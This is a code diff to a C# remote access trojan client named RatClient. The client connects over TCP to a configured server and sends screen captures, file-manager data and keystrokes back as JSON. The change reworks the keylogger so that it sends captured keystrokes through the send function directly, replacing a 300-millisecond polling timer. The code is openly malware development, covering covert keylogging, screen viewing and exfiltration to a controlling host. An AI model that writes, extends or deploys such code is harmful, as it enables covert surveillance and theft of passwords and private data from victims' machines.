@@ -2,7 +2,6 @@ using System;
 using System.Net.Sockets;
 using System.Text;
 using System.Web.Script.Serialization;
-using System.Timers;
 using RatClient.Config;
 using RatClient.Features;
 
@@ -10,7 +9,6 @@ class Program
 {
     #region Variables
     private Config config = new Config();
-    private static Timer keySendTimer;
     static TcpClient client;
     static NetworkStream stream;
     static readonly string Server = Config.IP;
@@ -20,7 +18,7 @@ class Program
 
     #region Features
     static ScreenViewer screenViewer = new ScreenViewer(bufferSize, SendJson);
-    static KeyLogger keyLogger = new KeyLogger();
+    static KeyLogger keyLogger = new KeyLogger(SendJson);
     static FileManager fileManager = new FileManager(SendJson);
     #endregion
 
@@ -35,11 +33,6 @@ class Program
             stream = client.GetStream();
 
             SendInfo();
-
-            // Keylogger
-            keySendTimer = new Timer(300);
-            keySendTimer.Elapsed += SendKeystrokes;
-            keySendTimer.Start();
 
             while (true)
             {
@@ -71,15 +64,6 @@ class Program
             case "heartbeat":
                 SendJson(new { type = "heartbeat", text = "pong" });
                 break;
-        }
-    }
-
-    static void SendKeystrokes(object sender, ElapsedEventArgs e)
-    {
-        string keystrokes = KeyLogger.GetKeystrokes();
-        if (!string.IsNullOrEmpty(keystrokes))
-        {
-            SendJson(new { type = "keystroke", key = keystrokes });
         }
     }
 
